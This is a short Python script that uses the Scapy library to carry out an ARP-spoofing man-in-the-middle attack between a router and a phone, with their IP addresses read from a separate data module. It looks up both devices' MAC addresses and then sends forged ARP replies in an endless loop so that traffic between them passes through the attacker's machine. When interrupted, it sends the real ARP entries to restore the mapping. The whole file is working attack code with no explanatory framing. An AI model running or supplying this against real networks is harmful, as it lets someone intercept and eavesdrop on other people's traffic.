from scapy.all import ARP, Ether, send, srp
import time
import data

def getMacAddress(ip, interface="en0"):
    query = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    
    ans, unans = srp(query, timeout=2, iface=interface, verbose=False)
    
    if(ans):
        return ans[0][1].hwsrc
 
def middleManARP():
    mac_addressRouter = getMacAddress(data.ipRouter)
    mac_addressPhone = getMacAddress(data.ipPhone)

    packet1 = ARP(
        op=2,
        pdst= data.ipRouter,
        hwdst= mac_addressRouter,
        psrc = data.ipPhone
    )

    packet2 = ARP(
        op=2,
        pdst = data.ipPhone,
        hwdst = mac_addressPhone,
        psrc = data.ipRouter
    )

    realPacket1 = ARP(
        op=2,
        pdst= data.ipRouter,
        hwdst = mac_addressRouter,
        psrc = data.ipPhone,
        hwsrc = mac_addressPhone
    )

    realPacket2 = ARP(
        op = 2,
        pdst = data.ipPhone,
        hwdst = mac_addressPhone,
        psrc = data.ipRouter,
        hwsrc = mac_addressRouter
    )

    while(True):
        try:
            send(packet1)
            send(packet2)
            time.sleep(2)
        except KeyboardInterrupt:
            send(realPacket1)
            send(realPacket2)
            break